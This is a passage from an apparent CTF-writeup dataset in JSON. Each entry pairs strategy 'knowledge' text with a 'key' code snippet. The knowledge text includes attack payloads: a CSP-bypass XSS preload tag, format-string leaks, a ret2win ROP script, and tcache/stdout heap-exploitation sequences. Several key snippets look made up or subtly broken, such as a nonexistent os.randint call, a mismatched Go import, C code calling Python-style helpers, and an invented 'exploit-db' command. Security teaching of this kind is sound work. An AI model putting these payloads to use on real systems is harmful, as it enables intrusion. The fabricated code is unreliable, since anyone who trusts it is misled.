            "In challenges involving encoding hidden within file contents, differentiating characters (such as various whitespace characters: spaces and tabs) can represent binary data. In this case, one character (e.g., space) represents binary \"0\" and another character (e.g., tab) represents binary \"1\". A potential strategy is to substitute these characters with binary digits and use a tool to convert from binary to the encoded message. Example conversion in Python:\n```python\nline = line.replace(\" \", \"0\").replace(\"\\t\", \"1\")\n```",
            "For challenges expecting binary-encoded flags, it can be beneficial to identify a known portion of the flag (e.g., the closing curly bracket) in its binary form to confirm the encoding scheme (space for \"0\" and tab for \"1\" in this context). This confirmation can help in the correct conversion of binary data back to text."
        ],
        "key": "```python\nwith open(\"transmission.txt\", \"r\") as f:  \n   lines = f.readlines()\n\nfor line in lines:  \n   bin_char = []  \n   line = line.replace(\"\\n\", \"\")  \n   for char in line:  \n       if char == \" \":  \n           bin_char.append(\"0\")  \n       elif char == \"\\t\":  \n           bin_char.append(\"1\")  \n   print(\"\".join(bin_char))\n```"
    },
    {
        "name": "byte_me",
        "write_up": "dataset/raw/byte_me.md",
        "type": "crypto",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When dealing with ECB (Electronic Codebook) encryption challenges, identify the padding method and block size to strategize the decrpytion process. In these challenges, because identical plaintext blocks are encrypted into identical ciphertext blocks and the data is processed in separate blocks, one can manipulate inputs to control block contents. This involves inputting a controlled string that, when concatenated with the flag, helps in identifying how data is segmented into blocks, thus making it easier to bruteforce the encryption byte by byte by observing changes in the ciphertext.",
            "In scenarios where a challenge adds a random string of arbitrary length to the user input before encrypting, one strategy involves sending a long, repeating string (e.g., 'a' * 64) to create a predictable pattern in the encrypted data. Then, by incrementally appending characters to the input and analyzing when the ciphertext produces repetitive blocks, you can determine the offset introduced by the random string. This knowledge assists in aligning your input correctly with the encryption block sizes, enabling the application of typical ECB decryption techniques regardless of the preappended random data length."
        ],
        "key": "```python\nfrom Crypto.Cipher import AES\nimport os\n\ndef encrypt_ecb(input_data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    padded_data = pad(input_data)\n    return cipher.encrypt(padded_data)\n\ndef pad(data):\n    padding_length = 16 - (len(data) % 16)\n    return data + bytes([padding_length] * padding_length)\n\ndef service(input_data):\n    random_prefix = os.urandom(os.randint(0, 16))\n    flag = b\"flag{fakeflag}\"\n    data_to_encrypt = random_prefix + input_data + flag\n    key = os.urandom(16)\n    return encrypt_ecb(data_to_encrypt, key)\n```"
    },
    {
        "name": "B__e64",
        "write_up": "dataset/raw/B__e64.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "TSG/2021",
            "https://ctftime.org/event/1431/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges involving Base64 encoding and a requirement to deduce the original message from a partially known encoded string, one can employ a brute-force approach based on character-by-character matching. This approach leverages the Base64 encoding redundancy where fixing the first $n$ characters of the message will also fix the first $\\left\\lfloor \\frac{4}{3}\\right\\rfloor^n$ characters of the encoded message. This allows for an iterative procedure to match known parts of the encoded message with possible original characters until the entire message is reconstructed. This method is particularly useful when the encoded message has certain known characters (denoted as non-'*') and the task is to find the original message that fits these known encoded parts.",
            "In scenarios where the goal is to identify critical parts of an encoded message to retain while masking others, an effective strategy involves calculating the entropy for each character position across multiple encoded samples of potential messages. Positions with higher entropy are considered more valuable for deciphering the original message. Therefore, one can design a mask that retains characters at high-entropy positions and masks others, ensuring the uniqueness of the masked message so it can be correctly mapped back to a single original message. This methodology is crucial when a challenge limits the amount of information that can be known about the encoded message, but there is flexibility to choose which parts of the message to reveal. In practical terms, this approach guides the creation of a mask that maximizes the probability of correctly guessing the original message with minimal known information, by focusing on revealing the parts of the message that hold the most 'information' per character based on their entropy."
        ],
        "key": "```python\ndef almost_eq(seq, pat):  \n return all(s == p or p == '*' for s, p in zip(seq, pat))\n\ndef solve(s, n=32, charset=CHARSET):  \n assert len(s) == len(enc(' ' * n))\n\n dr = []  \n for i in range(n):  \n   b = i + 1  \n   for _ in range(8):  \n     b = b * 8 // 6  \n   dr.append(b)  \n dr[-1] = len(s)\n\n cur = 0  \n res = [0] * n  \n while cur < n:  \n   m = ''.join(charset[x] for x in res)  \n   c = enc(m)  \n   if almost_eq(c[:dr[cur]], s[:dr[cur]]):  \n     cur += 1  \n   else:  \n     res[cur] += 1  \n     rc = cur  \n     while res[rc] == len(charset):  \n       res[rc] = 0  \n       rc -= 1  \n       res[rc] += 1  \n return ''.join(charset[x] for x in res)  \n```"
    },
    {
        "name": "C is G _ Ez Camel",
        "write_up": "dataset/raw/C is G _ Ez Camel.md",
        "type": "crypto",
        "competition": [
            "Securinets/2020/Quals",
            "https://ctftime.org/event/1016/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "In scenarios involving ElGamal encryption, if the modulus \\(n\\) is unknown, one can recover \\(n\\) by encrypting messages with controlled values and observing the server's responses. Specifically, choose \\(m = 1\\) and a \"random\" \\(y = 1\\) to get \\(c_1 = g\\) and \\(c_2 = h\\) from the server. Then, encrypt \\(m = 4\\) with \\(y = 1\\), and use the difference between \\(4h\\) and \\(c_2\\) returned by the server to calculate \\(n = 4h - c_2\\), assuming \\(4h \\geq n\\). This method relies on manipulating the encryption of known plaintexts to expose the modulus.",
            "ElGamal's homomorphic properties can be exploited to decrypt ciphertext without the private key when having control over \\(c_2\\). If the server's \"decrypt\" functionality refuses to decrypt the original ciphertext but accepts modified \\(c_2\\) values, then:\n   - Multiplying \\(c_2\\) by a constant \\(k\\) (e.g., \\(2c_2\\)) before sending it to the server for decryption will result in the plaintext being multiplied by the same constant. The original plaintext \\(m\\) can be recovered by multiplying the server's response by the modular inverse of \\(k\\) modulo \\(n\\).\n   - Alternatively, sending \\((c_1, 1)\\) to the server for decryption and getting the inverse of \\(s\\) allows one to manually compute the decrypted message by multiplying this inverse with \\(c_2\\).\n\nExample of exploiting homomorphic property with a constant \\(k = 2\\):\n- Original ciphertext: \\((C1, C2)\\)\n- Modified request for decryption: \\((C1, 2C2)\\)\n- Server decrypts to \\(2m\\) (where \\(m\\) is the original message).\n- Compute \\(m = 2m * mod\\_inverse(2, n) \\% n\\)."
        ],
        "key": "```python\ndef encrypt(m, y):  \n   s.sendlineafter(b'Your choice :', b'1')  \n   s.sendlineafter(b'Your Message in mentioned format', str(m).encode())  \n   s.sendlineafter(b'Your random', str(y).encode())  \n   s.recvuntil(b'\\n(')  \n   c1 = int(s.recvuntil(b',').rstrip(b',').decode())  \n   c2 = int(s.recvuntil(b')').rstrip(b')').decode())  \n   return c1, c2\n\ndef decrypt(c1, c2):  \n   s.sendlineafter(b'Your choice :', b'2')  \n   s.sendlineafter(b'C1 :', str(c1).encode())  \n   s.sendlineafter(b'C2 :', str(c2).encode())  \n   s.recvuntil(b'Get your message : ')  \n   return int(s.recvline().strip().decode())\n\ng, h = encrypt(1, 1)  \n_, h4 = encrypt(4, 1)\n\nN = h * 4 - h4  \nassert isprime(N)  \nlog.info('Got N')\n\nC2x = 2 * C2 % N  \nmx = decrypt(C1, C2x)  \nm = mx * mod_inverse(2, N) % N  \nprint(hex(m))  \nprint(unhexlify(hex(m)[2:]))  \n```"
    },
    {
        "name": "calc",
        "write_up": "dataset/raw/calc.md",
        "type": "pwn",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing strict Content Security Policy (CSP) preventing basic injection attacks in a web environment, HTML injection can be utilized to block subresource loading by leveraging browser features. Specifically, using a preload link with an integrity attribute containing an incorrect hash will prevent the targeted script from loading. This technique is useful when needing to bypass client-side input sanitization scripts to execute arbitrary JavaScript. Example payload: `<link rel=preload as=script integrity=sha256-incorrectHash href=filter.js>` can be used to block the loading of `filter.js` if it's executed before the script tag for `filter.js`.",
            "In situations where input is being evaluated (using `eval` or similar functions) and filtered to only allow certain characters (e.g., numbers and simple arithmetic operators), consider employing JavaScript string coercion and bitwise operators to bypass filters. These techniques allow for the execution of arbitrary JavaScript despite restrictions. By crafting input that is interpreted differently upon execution, it's possible to carry out actions that were not intended by the input sanitizer. In the context of a target expecting numeric input, an attacker can use expressions that evaluate to execute JavaScript, thereby enabling techniques such as cookie theft or other Cross-Site Scripting (XSS) payloads without directly using disallowed characters. Example payload: Using arithmetic operations or encoded characters that resolve to JavaScript code upon evaluation."
        ],
        "key": "```javascript  \nwindow.addEventListener('DOMContentLoaded', () => {  \n   let regex = /[^0-9\\+\\-]+/;  \n   if (calc.length > 100) calc = \"1337\";  \n   calc = calc.replace(/ /g, \"+\");  \n   if (regex.test(calc)) calc = \"1337\";  \n});  \n\nlet calc = new URL(location).searchParams.get(\"calc\") || \"1337\";  \nonload = () => {  \n   alert(eval(calc));  \n}  \n```"
    },
    {
        "name": "Califrobnication",
        "write_up": "dataset/raw/Califrobnication.md",
        "type": "reverse",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 120,
        "max_score": 300,
        "difficulty": 0.4,
        "knowledge": [
            "When facing challenges involving pseudo-random functions like **strfry**, where the randomness is seeded by known or predictable values such as **current time** xor **process ID (PID)**, the sequence of operations leading to the \"randomization\" can be reversed. This allows for the recovery of the original data if both the seed values and the algorithm's behavior are well-understood. In such scenarios, brute-forcing through the range of possible seed values (derived from the time and PID range) to reverse the randomization process can lead to the retrieval of the original data. This approach requires an understanding of how the seeding process works and how to replicate the sequence of operations made by the pseudo-random function.",
            "The **memfrob()** function's encryption can be easily reversed if the byte-wise operation applied is known. Since memfrob() employs an XOR operation with a fixed numeric value (42 in this case) over the data, reversing the encryption is as simple as applying **memfrob()** again to the data. This particular characteristic highlights the importance of understanding the reversible nature of certain encryption functions, especially in CTF challenges where cryptographic operations might not be complex. This knowledge is crucial when dealing with custom encryption schemes that use basic operations such as XOR for data obfuscation."
        ],
        "key": "```c++\n#include <stdio.h>  \n#include <string.h>\n\nint main() {  \n\tFILE *f;  \n\tchar flag[50];  \n\tf = fopen(\"flag.txt\", \"r\");  \n\tfread(flag, 50, 1, f);  \n\tstrtok(flag, \"\\n\");  \n\tmemfrob(&flag, strlen(flag));  \n\tstrfry(&flag);  \n\tprintf(\"Here's your encrypted flag: %s\\n\", &flag);  \n}  \n```"
    },
    {
        "name": "Camouflage",
        "write_up": "dataset/raw/Camouflage.md",
        "type": "misc",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "In challenges related to hidden data in audio files, Steghide can be utilized to extract hidden files without requiring a password, as suggested by hints indicating the lack of password requirements. This approach relies on investigating the audio file for any embedded files, which is a common technique for audio steganography. The extraction command is `steghide extract -sf [audiofile]`.",
            "When a challenge involves audio steganography and provides hints towards data hidden within images extracted from audio files, tools like ARSS (Analysis & Resynthesis Sound Spectrograph) can convert bitmap images back to audio based on specifications like Sampling Rate, Bands Per Octave, pps (pulses per second?), minimum frequency, and Bits per sample. This can reveal audio clues or further data encoded within the sound spectrum of the image. The knowledge about the specifications is crucial for successful conversion and can be used to uncover hidden messages or flags in the audio file generated from the image."
        ],
        "key": "```python\ndef extract_hidden_data(audio_file):\n    # Simulate a vulnerable function that extracts hidden data from an audio file\n    # This function does not perform any security checks on the input file\n    with open(audio_file, 'rb') as f:\n        data = f.read()\n    # Assume the hidden data is at a specific offset\n    hidden_data_offset = 1024\n    hidden_data = data[hidden_data_offset:]\n    return hidden_data\n\n# Example usage\naudio_file = \"Camouflage-sound.wav\"\nhidden_data = extract_hidden_data(audio_file)\nprint(hidden_data)\n```"
    },
    {
        "name": "cancelled",
        "write_up": "dataset/raw/cancelled.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2020",
            "https://ctftime.org/event/929/tasks/"
        ],
        "score": 1879,
        "max_score": 1991,
        "difficulty": 0.9437468608739327,
        "knowledge": [
            "In heap exploitation challenges, specifically when dealing with tcache and unsorted bins, exploiting off-by-one vulnerabilities can lead to arbitrary memory write or control of the metadata of heap chunks. This technique can be used to manipulate the heap's state to overlap chunks, control freed chunk pointers, and ultimately execute an arbitrary code execution attack via hooking functions like `malloc_hook` with a one_gadget. To achieve this, manipulate chunk sizes and free orders to create a desired heap layout that enables overwriting function pointers with desired addresses.",
            "In challenges that involve leaking libc addresses to bypass ASLR, one can use the partial overwrite on a pointer that is subsequently used to write to or read from a file or standard output to leak libc addresses. Specifically, manipulating the `fd` pointer of a chunk in the tcache or unsorted bin to point near a libc structure (like the `_IO_2_1_stdout_` structure) can enable one to leak libc base addresses by overwriting parts of the file structure to enforce a controlled read or write. This approach requires brute-forcing the least significant byte(s) of the target address if ASLR is enabled.\n\nExample payload to achieve libc leak via manipulating `fd` pointer and stdout structure:\n\n```python\nadd(6, \"a\", 0x538, '\\x60\\xa7') # Partial overwrite to manipulate `fd`\nadd(7, \"tcache\", 0x38, 'a')  \nadd(8, \"stdout\", 0x38, p64(0xfbad1800)+b'\\x00'*25) # Write to stdout structure to leak libc\n```"
        ],
        "key": "```c\nvoid add(int idx, char* name, int desc_len, char* desc) {\n    printf(\"Add %x\\n\", desc_len);\n    sendline(\"1\");\n    sendlineafter(\"Index: \", idx);\n    sendlineafter(\"Name: \", name);\n    sendlineafter(\"Length of description: \", desc_len);\n    sendafter(\"Description: \", desc);\n}\n\nvoid cancel(int idx) {\n    sendlineafter(\">\", \"2\");\n    sendlineafter(\": \", idx);\n}\n\nadd(0, \"a\", 0x38, \"a\");\nadd(1, \"a\", 0x4F8, \"a\");\nadd(2, \"a\", 0x38, \"a\");\nadd(3, \"a\", 0x4F8, \"a\");\nadd(4, \"a\", 0x78, \"a\");\ncancel(0);\nadd(0, \"a\", 0x38, 'a'*0x38+'\\x41');\ncancel(2);\ncancel(1);\ncancel(3);\nadd(5, \"a\", 0x4F8, 'a');\nadd(6, \"a\", 0x538, '\\x60\\xa7');\nadd(7, \"tcache\", 0x38, 'a');\nadd(8, \"stdout\", 0x38, p64(0xfbad1800)+b'\\x00'*25);\n```"
    },
    {
        "name": "Careless Padding",
        "write_up": "dataset/raw/Careless Padding.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "HITCON/2023/Quals",
            "https://ctftime.org/event/2019/tasks/"
        ],
        "score": 255,
        "max_score": 500,
        "difficulty": 0.51,
        "knowledge": [
            "In a challenge related to padding oracle attacks, if the plaintext data is structured in a predictable manner (e.g., JSON format with a known structure), it can be utilized to create a known plaintext block. This can assist in executing controlled manipulations, such as XORing the plaintext block with the Initialization Vector (IV) to forge a ciphertext block that decrypts to a predetermined value. This technique can be crucial for manipulating block cipher encryption when dealing with CBC mode.\n   - Example of creating a known plaintext block for manipulation: Let's assume `{'win': 'value'}` is a known structure where `value` is controllable. An attacker can XOR the known plaintext with the IV to create a ciphertext block that decrypts to a specific, predictable value.",
            "When attempting to bypass encryption and reveal plaintext bit by bit in CBC mode encryption without direct access to decryption errors or successes, understanding and leveraging padding behavior can enable the deduction of plaintext bits. To exploit padding oracle vulnerabilities for revealing bits, except the last one, manipulate the IV or one of the preceding ciphertext blocks such that the decryption process produces a padding error or success based on the manipulated value. This method relies on predictable padding behavior and can reveal up to the top 7 bits of a byte. For the least significant bit, a brute-force attack against all possible byte values can be employed to infer its value based on the presence or absence of padding errors, effectively using these outcomes as an oracle.\n   - Example approach to brute-force the last bit: For a targeted byte, create various payloads where the byte is XORed with all possible values from 0x00 to 0xFF. Observe the server's response to determine if a valid padding was achieved. This can indirectly indicate whether the modified byte matches the expected value, allowing the deduction of the last bit."
        ],
        "key": "```python\ndef unpad(padded_data):\n    padding_len = padded_data[-1]\n    if padding_len > len(padded_data):\n        raise ValueError(\"Invalid padding\")\n    return padded_data[:-padding_len]\n\ndef decrypt(ciphertext, iv, key):\n    # Decrypt the ciphertext with the key and iv\n    plaintext = decrypt_aes_cbc(ciphertext, key, iv)\n    return unpad(plaintext)\n\ndef encrypt(plaintext, iv, key):\n    # Pad the plaintext to a multiple of block size\n    padding_len = 16 - (len(plaintext) % 16)\n    padded_plaintext = plaintext + bytes([padding_len] * padding_len)\n    # Encrypt the padded plaintext with the key and iv\n    return encrypt_aes_cbc(padded_plaintext, key, iv)\n```"
    },
    {
        "name": "Casino 2",
        "write_up": "dataset/raw/Casino 2.md",
        "type": "crypto",
        "competition": [
            "TetCTF/2023",
            "https://ctftime.org/event/1842/tasks/"
        ],
        "score": 919,
        "max_score": 971,
        "difficulty": 0.9464469618949537,
        "knowledge": [
            "When dealing with pseudo-random number generators (PRNG) like the Golang `rand.Intn` in scenarios where the random output is crucial for predicting future values (such as betting or lottery systems), understanding the underlying algorithm can be instrumental. For Golang's `rand.Intn`, it involves a Lagged Fibonacci Generator which implies that the PRNG has an internal state that can be exploited if the sequence or a part of it can be observed or influenced. Essentially, knowing a series of outputs and the algorithm can help in predicting future outputs, given that the PRNG relies on its internal state which consists of the last `607` numbers. Betting on a sequence of random numbers to learn about the internal state mod some known value aids in approximating the state for prediction purposes.",
            "The strategy to exponentially increase the balance in betting systems, where outcomes are influenced by predictions on pseudo-random generation, involves dividing the balance into several equal parts and betting a fraction of it each time. By betting fractions like `1/10th` of the balance and winning, substantial gains are garnered. Even in loss scenarios, maintaining a fraction of the balance ensures that one can continue betting without depleting resources completely. This method leverages the probabilistic winning to exponentially increase the balance by making calculated bets based on predicted outcomes. This approach showcases how strategic betting based on predictions and maintaining a safety net in the form of a balance fraction can work together to significantly amplify gains over time."
        ],
        "key": "```go\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"encoding/binary\"\n\t\"math/rand\"\n)\n\nfunc main() {\n\tvar tmp [8]byte\n\tcryptorand.Read(tmp[:])\n\tseed := int64(binary.LittleEndian.Uint64(tmp[:]))\n\trand.Seed(seed)\n\n\t// Vulnerable PRNG usage\n\trandomNumber := rand.Intn(2023)\n\t// Use randomNumber in the betting logic\n}\n```"
    },
    {
        "name": "Cat Me if You Can",
        "write_up": "dataset/raw/Cat Me if You Can.md",
        "type": "misc",
        "competition": [
            "HackPack/2023",
            "https://ctftime.org/event/1893/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with a scenario where traditional commands to read a file (like `cat`) do not work as expected on a Unix/Linux system, alternative file reading techniques can be explored. One such technique is Bash's command substitution which allows the contents of a file to be expanded and used directly in the shell. This can be particularly useful in restricted shell environments or when the executable permissions on traditional file reading commands have been altered to prevent their direct usage.\n\n   Example command using command substitution to read a file: `echo $(< filename.txt)`",
            "Understanding and leveraging Bash features can provide unconventional ways to bypass restrictions imposed in a shell environment. Bash's command substitution (`$(< file)`) can be used to directly execute the contents of a file or to bypass restrictions on file reading commands by executing the content as part of an echo command, even when direct execution or reading is not allowed. This approach emphasizes the importance of knowing different Linux shells' features and capabilities, particularly when troubleshooting or navigating through restricted access contexts.\n\n   Example command demonstrating direct content execution through command substitution without echo: `$(< filename.txt)`"
        ],
        "key": "```bash\n#!/bin/bash\n\ncat() {\n  if [ \"$1\" == \"flag.txt\" ]; then\n    echo \"hissssss\"\n  else\n    /bin/cat \"$@\"\n  fi\n}\n```"
    },
    {
        "name": "Cat",
        "write_up": "dataset/raw/Cat.md",
        "type": "misc",
        "competition": [
            "0xL4ugh/2021",
            "https://ctftime.org/event/1248/tasks/"
        ],
        "score": -1.0,
        "max_score": 825,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving format string vulnerabilities, iterating through the format specifiers (e.g., `%n$x` where `n` is an integer starting from 1 and incrementing) can be used to leak memory contents. This technique can be applied to locate and extract sensitive data such as flags from a program's memory. After extracting the raw memory data that looks like the flag or parts of it, tools like CyberChef can be used for decoding. This may involve operations like swapping endianness, converting from hex, and removing null bytes.\n   \n   Example payload: `%1$x%2$x%3$x` followed by decoding steps in CyberChef as needed.",
            "In challenges where buffer overflow vulnerabilities are present, especially in programs that contain a `win()` function or similar, a ret2win exploitation strategy can be successfully employed. This involves creating a ROP (Return-Oriented Programming) chain that overflows the buffer and redirects execution to the desired function that was not originally called by the program. It's crucial to note that for binaries compiled for a 64-bit architecture, the stack must be 16-byte aligned before calling `system()` to prevent segmentation faults. Crafting the payload often requires finding the buffer overflow offset using tools like `cyclic` from the pwntools suite, and carefully arranging ROP gadgets, `ret` instructions if needed for alignment, and the address of the `win` function.\n\n   Example script snippet:\n   ```python\n   from pwn import *\n   # Setup connection, context, and binaries\n   rop = ROP(exe)\n   ret = rop.find_gadget([\"ret\"])\n   rop.raw(offset * b\"A\")  # Padding to reach return address\n   rop.call(ret)  # 16-byte alignment if necessary\n   rop.call(exe.symbols.win)  # calling win function\n\n   # Send rop chain to the target\n   r.sendline(rop.chain())\n   ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid win() {\n    system(\"/bin/sh\");\n}\n\nint main() {\n    char buffer[128];\n    printf(\"This is dangerous!\\n\");\n    gets(buffer);\n    printf(buffer);\n    return 0;\n}\n```"
    },
    {
        "name": "Catastrophe",
        "write_up": "dataset/raw/Catastrophe.md",
        "type": "pwn",
        "competition": [
            "TSG/2021",
            "https://ctftime.org/event/1431/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To defeat the safe-linking mechanism in a challenge where the glibc version is 2.32 or higher, leaking a heap address can be achieved by printing a freed chunk's address once inserted into the tcache. This method involves taking advantage of how chunks are encrypted in the tcache, specifically by observing the first time a chunk is inserted into a tcache list, where `e->next` is initialized to `&e->next >> 12` (heap base address) xor `tcache->entries[tc_idx]`, which equals zero when the list for a given size is empty.",
            "Implementing a [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) strategy provides a Write-What-Where primitive by poisoning the tcache, especially under scenarios where classic hooks like `__malloc_hook` or `__free_hook` are absent. This strategy involves creating overlapping chunks to exploit the tcache mechanism. Specifically, the steps include filling the tcache with 7 `0x100` sized chunks, followed by creating additional chunks and leveraging the allocation and deallocation sequence to manipulate the tcache's state, leading to a condition where arbitrary writes can be achieved by requesting chunks of specific sizes that interact with the poisoned tcache entry.\n\nExample Implementation:\n```python\n# Assuming appropriate functions `alloc`, `free`, and setup already exist\nfor i in range(7):\n   alloc(i, b\"A\" * 0x100, 0x100)  # Fill tcache with 0x100 sized chunks\nalloc(7, b\"B\" * 0x100, 0x100)  # prev chunk\nalloc(8, b\"C\" * 0x100, 0x100)  # a chunk\nalloc(9, b\"D\" * 0x10, 0x10)    # Barrier chunk to prevent consolidation with top chunk\nfor i in range(7):  \n   free(i)                       # Fill the tcache\nfree(8)                          # Move `a` chunk to unsorted bin\nfree(7)                          # Consolidate `prev` with `a` creating large chunk still in unsorted bin\nalloc(0, b\"E\" * 0x100, 0x100)   # Request a chunk to proceed with poison\n# At this point, a manipulation similar to the described approach can be employed to achieve write-what-where\n```"
        ],
        "key": "```c\n#define PROTECT_PTR(pos, ptr) \\\n ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n\nstatic __always_inline void\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n    detect a double free.  */\n e->key = tcache_key;\n\n e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);\n tcache->entries[tc_idx] = e;\n ++(tcache->counts[tc_idx]);\n}\n```"
    },
    {
        "name": "Catchmouse",
        "write_up": "dataset/raw/Catchmouse.md",
        "type": "reverse",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 690,
        "max_score": 906,
        "difficulty": 0.7615894039735099,
        "knowledge": [
            "In reverse engineering challenges involving Android APKs that utilize both Java and native libraries (such as JNI libraries), it is beneficial to decompile Java code and to directly analyze the compiled native libraries. Tools like Procyon for Java decompilation and using `mmap` for executing native functions directly in C, as demonstrated with the JNI library functions in the challenge, are effective techniques. This approach can facilitate understanding complex application flows spanning both the Java and native code domains.",
            "For challenges involving cryptographic operations where the key is derived from application data (like scores or signatures), using dynamic instrumentation frameworks like Frida to intercept and manipulate running application logic is crucial. In this scenario, Frida was used to capture the base64 encoding of an application signature directly from memory. This strategy can uncover hidden or obfuscated cryptographic material, making it possible to reverse engineer the application's cryptographic procedures. \n\n   - Example of using Frida to capture base64 encoded strings:\n     ```javascript\n     Java.perform(function () {\n       Java.use(\"java.lang.StringBuilder\").toString.implementation = function() {\n         var ret = this.toString();\n         console.log(\"sb = \" + ret);\n         return ret;\n       };\n     });\n     ```",
            "When aiming to decrypt or reverse-engineer values protected by cryptographic operations (e.g., AES-128-CBC encryption), and when the key or IV is dynamically derived from user input or other application-specific data, it's effective to brute-force the possible range of input values if feasible (like scores within a certain interval). This approach, coupled with a script or program that rapidly iterates through the possible values, can be used to derive the correct input needed to reproduce the cryptographic key or IV. This is particularly applicable in contexts where the input range is known or can be inferred (e.g., a score range).\n\n   - Example of brute-forcing through a range of scores:\n     ```c\n     for(int i = 500; i < 1000; i++) {\n       long hash = i;\n       hash = ck1(0, 0, hash);\n       // Additional hash functions omitted for brevity\n       printf(\"%ld\\n\", hash);\n     }\n     ```"
        ],
        "key": "```c\nif ((param_3 < 1000) && (499 < param_3)) {\n\tlocal_20 = [...];\n}\nelse {\n\tlocal_20 = 0x12535623cbac930f;\n}\nreturn local_20;\n```"
    },
    {
        "name": "CatGirl Breach",
        "write_up": "dataset/raw/CatGirl Breach.md",
        "type": "misc",
        "competition": [
            "CyBRICS/2020",
            "https://ctftime.org/event/1012/tasks/"
        ],
        "score": 273,
        "max_score": 500,
        "difficulty": 0.546,
        "knowledge": [
            "When analyzing a binary file that initiates a dropper malware, it's beneficial to extract embedded scripts or code. In this scenario, extract scripts using tools like 7zip and analyze their functionality. For instance, if a VBS script is used to execute a .bat file that converts integer sequences into a hexadecimal file, one can replicate the conversion logic in a more efficient programming language like Python to accelerate analysis. Example Python code to accelerate this conversion:\n```python\ndata = open('madoka.bat', 'rb').read()\nres = map(int, re.findall('\\d+', data))\nres = [x for x in res if x != 456]\nopen('out.exe', 'wb').write(\"\".join(map(chr, res)))\n```",
            "In scenarios where malware encrypts files with a simplistic encryption algorithm, reverse engineering the encryption function can allow for the creation of a decryption function by inverting operation orders and changing operation signs. This method is especially applicable when the encryption algorithm uses basic operations (additions, subtractions) and loops over data blocks. After deducing the encryption logic, one can implement a decoder in the same programming language to decrypt the payload or files. Example decryption function based on reversed operations:\n```python\ndef stage1_dec_8(data, key):\n    a = ctypes.c_uint32(data[0])\n    b = ctypes.c_uint32(data[1])\n    wtf = ctypes.c_uint32(0)\n    const = 0x9e3779b8\n    for i in range(32):\n        wtf.value -= const\n    for i in range(32):\n        wtf.value += const\n        a.value += (b.value << 4) + key[0] ^ b.value + wtf.value ^ (b.value >> 5) + key[1]\n        b.value += (a.value << 4) + key[2] ^ a.value + wtf.value ^ (a.value >> 5) + key[3]\n    return a.value, b.value\n```"
        ],
        "key": "```python  \ndef stage1_enc_8(data, key):  \n   a = ctypes.c_uint32(data[0])  \n   b = ctypes.c_uint32(data[1])  \n   wtf = ctypes.c_uint32(0)  \n   const = 0x9e3779b8  \n   for i in range(32):  \n       b.value -= (a.value << 4) + key[2] ^ a.value + wtf.value ^ (a.value >> 5) + key[3]  \n       a.value -= (b.value << 4) + key[0] ^ b.value + wtf.value ^ (b.value >> 5) + key[1]  \n       wtf.value -= const  \n   return a.value, b.value  \n```"
    },
    {
        "name": "Caught Very Easily",
        "write_up": "dataset/raw/Caught Very Easily.md",
        "type": "The type of the challenge is OSINT (Open Source Intelligence).",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In OSINT challenges, clues in the flag format can direct the research path. For example, seeing \"EDB-ID\" in the flag format indicates the need to search for an exploit's ID in the Exploit Database. Applicable when the challenge hints at vulnerabilities, exploits, or specific cybersecurity databases.",
            "The context or background story provided in the challenge description can lead to targeted online searches. For instance, mentions of \"Ahmed Mansoor\" and \"jailbreak\" together with exploiting details like \"Pegasus Case\" guide towards searching for relevant exploit chains like the \"Trident Exploit Chain\" in cybersecurity contexts, thus narrowing down the search for precise vulnerabilities or exploits related to the narrative provided."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context of the write-up\nimport os\n\ndef execute_exploit(exploit_id):\n    # This function simulates executing an exploit based on an ID\n    # WARNING: This is a simulated example and should not be used in real scenarios\n    command = f\"exploit-db {exploit_id}\"\n    os.system(command)\n\n# Example usage\nexploit_id = \"44836\"  # This ID is related to the Pegasus exploit\nexecute_exploit(exploit_id)\n```\n"
    },
    {
        "name": "CB2",
        "write_up": "dataset/raw/CB2.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 100,
        "max_score": 350,
        "difficulty": 0.2857142857142857,
        "knowledge": [
            "When faced with a seemingly random string of characters and numbers in a cryptographic challenge, consider analyzing the character set to identify common cipher patterns. For instance, if the character set fits within a recognizable range (such as ASCII values that correspond to the printable character range utilized by specific ciphers like ROT47), this can be a strong indicator of the cipher type. Once identified, use appropriate decoding tools or websites, such as dcode.fr, to decrypt the message. \n   - Example scenario: A cryptographic message uses a subset of ASCII characters indicating a ROT47 cipher. Use dcode.fr to decode.",
